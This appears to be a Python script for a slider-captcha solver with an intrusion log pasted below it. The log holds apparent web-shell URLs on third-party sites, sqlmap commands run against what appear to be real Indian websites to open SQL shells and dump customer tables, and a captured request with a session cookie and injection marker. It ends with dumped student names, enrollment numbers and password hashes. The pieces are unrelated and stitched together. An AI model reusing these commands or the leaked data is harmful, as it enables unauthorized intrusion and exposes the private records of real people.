"""
# -*- encoding: utf-8 -*-
@Time    :   2021/12/23 12:45:18
@Author  :   yylime
@Contact :   844202100@qq.com
"""
http://cnrmt.cn/wp-content/languages/plugins/edit.php
http://www.nfd8.com/lev/js/560.asp?Action=upFile@action2=Post
from utils import Slider
from setting import Config
import argparse



parser = argparse.ArgumentParser()
parser.add_argument(
    "--name",
    default="yidun",
    type=str,
    help="find useful name in setting.py"
)
args = parser.parse_args()

if __name__ == "__main__":
    cfg = Config(args.name)

    slider = Slider(cfg)
    slider.run()




sh-3.2# python3  ../sqlmap.py -r drmertm.in.dic   --random-agent -risk 3   --technique=E  -D drmeulqx_drmertm  --sql-shell  --no-cast  --tables 

python3 sqlmap.py  -r ./test/centralbankofindia.co.in.dic  --random-agent --risk 3  --technique=U  -D complaint_management -T tbl_customer  --sql-shell    --batch --no-cast


select active,name,password,role,status,Address,email,mobile,username,gender,logincount  from  complaint_management.tbl_customer limit 10


POST /ORH/Response HTTP/1.1
Content-Type: multipart/form-data; boundary=----------YWJkMTQzNDcw
Accept: */*
X-Requested-With: XMLHttpRequest
Referer: https://drmertm.in/
Cookie: ci_session=9fd866877d56ce1f4920ad2466da4767ea38f42d
Content-Length: 193
Accept-Encoding: gzip,deflate,br
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
Host: drmertm.in
Connection: Keep-alive

------------YWJkMTQzNDcw
Content-Disposition: form-data; name="track_id"

1* 
------------YWJkMTQzNDcw--



[18:13:25] [INFO] resumed: 'MCH-2021-MBA-292'
select student_name,password,enrollment_number from students limit 5 [5]:
[*] WAGISH MAHESHWARI, e10adc3949ba59abbe56e057f20f883e, MCH-2021-MCA-111
[*] NOOR ALAM, e10adc3949ba59abbe56e057f20f883e, MCH-2021-MBA-293
[*] RAVI KUMAR, e10adc3949ba59abbe56e057f20f883e, MCH-2021-BCOM-052
[*] Janak Bihani, e10adc3949ba59abbe56e057f20f883e, MCH-2021-BBA-082
[*] DINESH KUMAR GUPTA, e10adc3949ba59abbe56e057f20f883e, MCH-2021-MBA-292
